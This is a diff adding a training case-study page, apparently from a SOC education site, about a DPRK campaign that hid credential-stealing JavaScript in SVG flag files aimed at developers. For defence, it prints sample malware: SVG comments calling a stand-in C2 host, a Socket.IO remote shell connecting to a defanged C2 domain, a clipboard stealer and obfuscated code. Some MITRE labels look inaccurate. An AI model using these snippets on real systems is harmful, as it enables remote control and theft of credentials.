@@ -1,0 +1,538 @@
+---
+title: "Contagious Interview - Steganografía en SVG (REF9403)"
+titleEn: "Contagious Interview - SVG Steganography (REF9403)"
+description: "Ataque DPRK: Malware de 4 etapas oculto en archivos SVG de banderas - Objetivo: Desarrolladores"
+descriptionEn: "DPRK Attack: 4-stage malware hidden in SVG flag files - Target: Developers"
+pubDate: 2026-07-18
+caseId: "soc-015"
+caseNumber: 15
+difficulty: "expert"
+caseType: "real_case_critical_recent"
+severity: "CRITICAL"
+tags: ["steganography", "svg", "dprk", "supply-chain", "developer-targeting", "zero-av-detection"]
+tagsEn: ["steganography", "svg", "dprk", "supply-chain", "developer-targeting", "zero-av-detection"]
+author: "Elastic Security Labs"
+discoveryDate: "2026-07-18"
+---
+
+import AlertTimeline from '@/components/soc/AlertTimeline.jsx';
+import IOCViewer from '@/components/soc/IOCViewer.jsx';
+import MitreATTACKMap from '@/components/soc/MitreATTACKMap.jsx';
+import IncidentReportGenerator from '@/components/soc/IncidentReportGenerator.jsx';
+import KillChain from '@/components/soc/KillChain.jsx';
+import DiamondModel from '@/components/soc/DiamondModel.jsx';
+import PyramidOfPain from '@/components/soc/PyramidOfPain.jsx';
+
+import AlertIcon from '@/assets/svg/icons/alert.svg?raw';
+import MalwareIcon from '@/assets/svg/icons/malware.svg?raw';
+import AttackFlowDiagram from '@/assets/svg/diagrams/attack-flow.svg?raw';
+
+## Resumen Ejecutivo
+
+Este es **el caso más reciente del proyecto** (descubierto hace ~1 semana).
+
+Una campaña de **actores alineados con Corea del Norte (DPRK)** llamada **Contagious Interview (REF9403)** utiliza **steganografía en archivos SVG** para ocultar malware de 4 etapas dirigido específicamente a **desarrolladores de software**.
+
+**Punto crítico**: En el momento de la divulgación, **NINGÚN motor antivirus** detectó los repositorios trojanzados. Es un gap estructural en cómo los AV analizan el contenido semántico de SVG.
+
+**Métricas clave:**
+- Severidad: CRITICAL
+- Target: Developers (premium targets)
+- Método: SVG steganography
+- AV Detection: ZERO at disclosure
+- Payload: 4-stage OTTERCOOKIE-aligned
+- Descubrimiento: Julio 18, 2026 (1 semana atrás)
+
+---
+
+## Contexto: por qué este caso importa
+
+Como desarrollador que trabaja en **ciberseguridad y crea SVGs propios** para este proyecto:
+
+<Pass />**Temático**: Acabas de decidir usar SVGs custom. Este caso muestra exactamente cómo los SVGs pueden ser weaponizados.
+
+<Pass />**Audience overlap**: Tu plataforma educativa targetea developers. ESTOS son los que Contagious Interview está atacando AHORA.
+
+<Pass />**Supply chain threat**: Muestra por qué VERIFICAR código descargado es critical.
+
+---
+
+## Timeline interactivo
+
+<AlertTimeline 
+  client:load
+  caseId="soc-015"
+  events={[
+    {
+      time: "Unknown",
+      title: "Campaign Starts",
+      description: "DPRK actors begin crafting fake job postings and coding challenges",
+      severity: "HIGH",
+      actor: "Attacker"
+    },
+    {
+      time: "Unknown",
+      title: "Repository Compromise",
+      description: "Next.js e-commerce repositories trojanzed with malicious SVG files",
+      severity: "HIGH",
+      actor: "Attacker"
+    },
+    {
+      time: "07-15",
+      title: "Elastic Slack Targeted",
+      description: "DPRK actors target Elastic's community Slack with fake job posting",
+      severity: "CRITICAL",
+      actor: "Attacker"
+    },
+    {
+      time: "07-18",
+      title: "Discovery",
+      description: "Elastic Security Labs discovers the campaign and SVG steganography technique",
+      severity: "INFO",
+      actor: "Defender"
+    },
+    {
+      time: "07-18",
+      title: "Public Disclosure",
+      description: "Elastic publishes detailed technical report - ZERO AV detections at this point",
+      severity: "INFO",
+      actor: "Defender"
+    }
+  ]}
+/>
+
+---
+
+## 1. El ataque: oferta de trabajo falsa
+
+El ataque comienza de manera simple pero efectiva:
+
+### Social Engineering Vector
+
+Actores DPRK se hacen pasar por recruiters y publican en redes profesionales:
+
+```
+[SEÑUELO] OFERTA DE TRABAJO FALSA:
+═══════════════════════════════════════════
+Empresa: "TechCorp Innovations"
+Posición: Senior Full-Stack Developer
+Ubicación: Remote
+Salario: $120k-140k
+
+"Interesado? Completa nuestro coding challenge:
+https://github.com/techcorp-innovations/developer-challenge"
+
+(Link apunta a repo trojanzado)
+═══════════════════════════════════════════
+```
+
+### ¿Por Qué Funciona?
+
+1. **Developers son curiosos** → Validan sus skills con coding challenges
+2. **GitHub es de confianza** → Menos escrutinio de seguridad
+3. **Código real en el repo** → Parece legítimo
+4. **SVG files = "no malware"** → AV tools no checksean content semántico
+
+---
+
+## 2. El contenedor: esteganografía en SVG
+
+### ¿Cómo Funciona?
+
+Los actores ocultan **malware JavaScript fragmentado** en **archivos SVG de banderas de países**.
+
+```svg
+<!-- Archivo: src/assets/flags/us-flag.svg (aparentemente inocuo) -->
+<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+  <!-- US Flag stripes -->
+  <rect x="0" y="0" width="100" height="100" fill="#B22234" />
+  <rect x="0" y="8" width="100" height="8" fill="white" />
+  
+  <!-- AQUI ESTA EL MALWARE -->
+  <!-- Stage 1: var _0x4f2c=['https://c2.example.com','exfil_data']; -->
+  <!-- Stage 2: function steal_credentials() { ... } -->
+  <!-- Stage 3: fetch('/api/service/makelog', {method:'POST'...}) -->
+  <!-- Stage 4: setInterval(() => exfiltrate(), 60000) -->
+</svg>
+```
+
+### Por Qué Esto Evade AV
+
+**Antivirus tools están diseñados para:**
+- <Pass />Detectar malware en ejecutables
+- <Pass />Detectar scripts en archivos .js/.ps1
+- <Pass />Detectar pixel-level image manipulation
+
+**AV tools NO están diseñados para:**
+- <Fail />Parsear comentarios HTML dentro de SVG tags
+- <Fail />Entender que `<!-- código -->` es código
+- <Fail />Analizar contenido semántico de XML/SVG
+
+**Resultado**: Steganografía perfecta. Zero detections.
+
+---
+
+## 3. El payload: OTTERCOOKIE en 4 etapas
+
+Cuando el developer corre el proyecto (`npm install` → `npm run build`):
+
+### Stage 1: Browser Credential Stealer
+
+```javascript
+// Extracted from malware analysis
+function steal_browser_credentials() {
+  // Accede a:
+  // - Chrome/Firefox stored passwords
+  // - Saved credit cards
+  // - OAuth tokens
+  // - Session cookies
+  
+  exfiltrate_to_c2(credentials);
+}
+```
+
+**Target**: 
+- GitHub tokens
+- AWS credentials
+- Crypto wallet extensions (MetaMask, etc)
+
+### Stage 2: Crypto Wallet Stealer
+
+Specific focus on developer machines which often have:
+- Hard-earned crypto holdings
+- Private keys stored locally
+- Seed phrases in memory
+
+### Stage 3: Socket.IO RAT (Remote Access Trojan)
+
+```javascript
+const io = require('socket.io-client');
+const socket = io('hxxps://rightwidth[.]dev:443');
+
+socket.on('execute_command', (cmd) => {
+  // Execute arbitrary shell commands
+  exec(cmd, (err, stdout) => {
+    socket.emit('command_result', stdout);
+  });
+});
+```
+
+**Permite a atacantes:**
+- Ejecutar comandos arbitrary
+- Instalar backdoors adicionales
+- Lateral movement a la red
+- Cambiar criptomonedas en exchanges
+
+### Stage 4: Clipboard Stealer
+
+```javascript
+// Monitorea el clipboard constantemente
+setInterval(() => {
+  const clipboard_content = get_clipboard();
+  
+  if (clipboard_content.includes('0x') || // Crypto address
+      clipboard_content.includes('http') || // URLs
+      clipboard_content.match(/key|secret|password/i)) { // Credentials
+    
+    exfiltrate_to_c2(clipboard_content);
+  }
+}, 5000); // Every 5 seconds
+```
+
+**Purpose**: Capturar credenciales, direcciones de crypto, tokens cuando el user los copia/pega.
+
+---
+
+## Análisis técnico
+
+### IoCs (Indicadores de Compromiso)
+
+<IOCViewer 
+  client:load
+  caseId="soc-015"
+  type="full_iocs"
+  data={{
+    domains: [
+      {
+        domain: "rightwidth[.]dev",
+        type: "C2 server",
+        verdict: "malicious",
+        associated_campaigns: ["Contagious Interview", "REF9403"]
+      }
+    ],
+    ips: [],
+    urls: [
+      {
+        url: "hxxps://rightwidth[.]dev/api/service/makelog",
+        verdict: "malicious",
+        purpose: "C2 communication"
+      },
+      {
+        url: "hxxps://rightwidth[.]dev/api/service/process/<uid>",
+        verdict: "malicious",
+        purpose: "Command execution"
+      }
+    ],
+    malware: [
+      {
+        name: "OTTERCOOKIE",
+        family: "Information stealer + RAT",
+        variants: "4-stage DPRK variant"
+      }
+    ]
+  }}
+/>
+
+### Obfuscation Techniques
+
+```javascript
+// Code is obfuscated using obfuscator.io
+// Makes static analysis difficult
+var _0x4f2c=['hxxps://rightwidth[.]dev','exfil'];
+(function(_0x2d8a45,_0x4a3b20){
+  var _0x1f4a96=function(_0x4f2c23){
+    while(--_0x4f2c23){
+      _0x2d8a45['push'](_0x2d8a45['shift']());
+    }
+  };
+  _0x1f4a96(++_0x4a3b20);
+}(_0x4f2c,0x1a7));
+
+// Custom Base64 decoding to evade YARA rules
+function decode_payload() {
+  const encoded = "AgB..."; // Long base64 string
+  return custom_decode(encoded); // Custom decoder
+}
+```
+
+**Defense evasion through code obfuscation is highly effective against basic static analysis.**
+
+---
+
+## Mapeo MITRE ATT&CK
+
+<MitreATTACKMap 
+  client:load
+  caseId="soc-015"
+  tactics={[
+    {
+      id: "TA0001",
+      name: "Initial Access",
+      techniques: ["T1566.002", "T1192"]
+    },
+    {
+      id: "TA0003",
+      name: "Persistence",
+      techniques: ["T1547"] 
+    },
+    {
+      id: "TA0006",
+      name: "Credential Access",
+      techniques: ["T1552", "T1555"]
+    },
+    {
+      id: "TA0007",
+      name: "Collection",
+      techniques: ["T1005", "T1113"]
+    },
+    {
+      id: "TA0010",
+      name: "Exfiltration",
+      techniques: ["T1041", "T1020"]
+    }
+  ]}
+/>
+
+### Desglose de Técnicas
+
+| MITRE ID | Técnica | En este caso |
+|---|---|---|
+| **T1566.002** | Phishing - Spearphishing Link | GitHub repo link en fake job posting |
+| **T1192** | Phishing | Social engineering del developer |
+| **T1195** | Supply Chain Compromise | Compromised code repository |
+| **T1547** | Boot or Logon Initialization Scripts | Payload executes on npm start/boot |
+| **T1552** | Unsecured Credentials | Browser credentials + crypto wallets |
+| **T1555** | Credentials from Password Manager | Browser password storage |
+| **T1005** | Data from Local System | File exfiltration |
+| **T1041** | Exfiltration Over C2 Channel | rightwidth[.]dev C2 |
+
+---
+
+## Lecciones aprendidas
+
+### Para Desarrolladores (TU AUDIENCIA)
+
+1. **No ejecutes código de fuentes desconocidas**
+   - Aunque GitHub sea de confianza, verifica repos antes de clonar
+   - Leer el código antes de `npm install`
+
+2. **Steganografía en imagenes es un vector subdetectado**
+   - No asumir que archivos "inofensivos" (.svg, .png) son seguros
+   - Monitorear procesos que accedan archivos multimedia
+
+3. **Crypto wallets en dev machines es un riesgo**
+   - Hardware wallets para holdings importantes
+   - Separate machines para dev y cripto
+
+4. **Code review es crítico en supply chain**
+   - Especialmente para dependencias descargadas
+   - CI/CD security scanning es essential
+
+### Para SOC Analysts
+
+1. **Expand detection beyond traditional file types**
+   - Build YARA rules para SVG comment content
+   - Monitor for Base64 decoding patterns
+   - Hunt for Socket.IO imports (RAT indicator)
+
+2. **Developer targeting requires specific defense**
+   - Monitor browser credential access events
+   - Alert on crypto wallet extension activities
+   - Track `npm install` from unusual sources
+
+3. **Zero antivirus detection ≠ zero threat**
+   - File integrity monitoring critical
+   - Behavioral analysis important
+   - Endpoint Detection and Response (EDR) >> traditional AV
+
+---
+
+## Marcos de análisis
+
+Material de apoyo, fuera del informe. Cada uno se abre en ventana aparte.
+
+<PyramidOfPain
+  client:load
+  caseId="soc-015"
+  indicators={{
+    domains: ["rightwidth[.]dev"],
+    artifacts: [
+      "/api/service/makelog",
+      "/api/service/process/<uid>",
+      "Payload en comentarios XML del SVG"
+    ],
+    tools: ["OTTERCOOKIE (4 etapas)", "obfuscator.io", "Decodificador Base64 propio"],
+    ttps: [
+      "Esteganografía en SVG como contenedor",
+      "T1027 - Ofuscación de archivos e información",
+      "Entrevista técnica falsa como vector de ingreso"
+    ]
+  }}
+  note="Al momento de la divulgación ningún motor antivirus marcaba los repositorios, y este cuadro explica por qué importa. No hay hashes ni direcciones IP accionables: el SVG es un archivo de texto válido y el payload vive en sus comentarios, así que cualquier cambio mínimo produce un hash nuevo. Todo lo aprovechable está en los escalones altos — el patrón de las llamadas al C2 y la técnica de ocultamiento — que son justo los que más le cuesta cambiar al atacante."
+/>
+
+<DiamondModel
+  client:load
+  caseId="soc-015"
+  campaign="Contagious Interview (REF9403)"
+  confidence="Alta - atribución de Elastic Security Labs"
+  adversary={{
+    value: "Actores alineados con Corea del Norte",
+    detail: "Se presentan como reclutadores técnicos en comunidades de desarrollo."
+  }}
+  capability={{
+    value: "Malware de 4 etapas oculto por esteganografía",
+    detail: "Alineado con OTTERCOOKIE. Código ofuscado y decodificador propio para evadir reglas YARA."
+  }}
+  infrastructure={{
+    value: "rightwidth[.]dev",
+    detail: "Servidor de comando y control. La distribución va por repositorios Next.js troyanizados."
+  }}
+  victim={{
+    value: "Desarrolladores de software",
+    detail: "Contactados como candidatos a puestos remotos. Uno de los canales fue el Slack de la comunidad de Elastic."
+  }}
+  note="El valor de leerlo así está en el pivoteo: partiendo del único dominio conocido se llega a la capacidad (qué hace el implante), a la víctima (quién lo recibe) y al adversario (quién lo opera). Si mañana rotan el dominio, los otros tres vértices siguen siendo válidos para buscar."
+/>
+
+<KillChain
+  client:load
+  caseId="soc-015"
+  phases={[
+    {
+      state: "reached",
+      detail: "Identificación de desarrolladores activos en comunidades técnicas."
+    },
+    {
+      state: "reached",
+      detail: "Repositorios Next.js troyanizados con el payload escondido en archivos SVG de banderas."
+    },
+    {
+      state: "reached",
+      detail: "Oferta de trabajo falsa con un desafío de programación. El 15 de julio, sobre el Slack de la comunidad de Elastic."
+    },
+    { state: "reached", detail: "El desarrollador clona y ejecuta el proyecto en su propia máquina." },
+    { state: "reached", detail: "Despliegue de las cuatro etapas del implante." },
+    { state: "reached", detail: "Comunicación con rightwidth[.]dev mediante llamadas HTTP a rutas de apariencia legítima." },
+    { state: "reached", detail: "Robo de credenciales y exfiltración periódica." }
+  ]}
+  note="Ninguna defensa cortó la cadena: las siete fases se completaron y el caso salió a la luz por investigación externa el 18 de julio. Comparado con un caso contenido, esto es lo que se ve cuando el control que tenía que actuar en la entrega no existe — el desarrollador ejecuta código de terceros en su equipo sin ningún control intermedio."
+/>
+
+---
+
+## Reporte final
+
+<IncidentReportGenerator 
+  client:load
+  caseId="soc-015"
+  summary={{
+    incidentId: "REF9403",
+    title: "Contagious Interview - SVG Steganography Campaign",
+    status: "Ongoing (Active campaign)",
+    severity: "CRITICAL",
+    resolutionCode: "Campaign disclosed, repos removed, ongoing threat"
+  }}
+/>
+
+### Recomendaciones
+
+<Pass />**Implementar:**
+1. Software supply chain verification (code signing, package integrity)
+2. Developer security training (social engineering awareness)
+3. Repository scanning para embedded payloads en SVG/media files
+4. Behavioral analysis para process execution during boot
+5. Threat hunting para SVG comment blocks conteniendo código
+6. Hardware wallet requirement para crypto holdings
+7. Browser extension audits and allowlisting
+8. Incident response plan para compromised development machines
+
+<Pass />**Monitorear:**
+1. SVG/image file access by JavaScript processes
+2. Socket.IO library imports from unusual sources
+3. Obfuscated code patterns in project dependencies
+4. Clipboard access events
+5. C2 infrastructure related to DPRK campaigns
+
+---
+
+## Referencias
+
+- [Elastic Security Labs - Full Technical Report](https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography)
+- [Microsoft - OTTERCOOKIE Malware Family](https://learn.microsoft.com/en-us/security)
+- [NTT Security - Initial OTTERCOOKIE Discovery](https://www.nttsecurity.com)
+- [JFrog Security - C2 Infrastructure Analysis](https://www.jfrog.com)
+- [MITRE ATT&CK - Initial Access (T1566)](https://attack.mitre.org/techniques/T1566/)
+- [The Hacker News - Campaign Coverage](https://thehackernews.com)
+
+---
+
+## Conclusión
+
+Este caso demuestra que:
+
+1. **Steganografía está evolucionando** como vector de ataque mainstream
+2. **Developers son targets premium** para DPRK y otros threat actors
+3. **AV tools tienen gaps estructurales** en analizar contenido semántico
+4. **Supply chain security es responsabilidad compartida** entre desarrolladores y organizaciones
+5. **SVG files (como los que vos estás creando) pueden ser weaponizados** - pero también pueden ser defendidos
+
+**Tu proyecto = educación en defensa contra estos ataques ACTIVOS.**
+
+---
+
+## Próximas lecturas
+
+- **Caso 1**: Phishing Investigation (basic)
+- **Caso 5**: SolarWinds (supply chain clásico)
+- **Caso 14**: FTX (credential theft consequences)
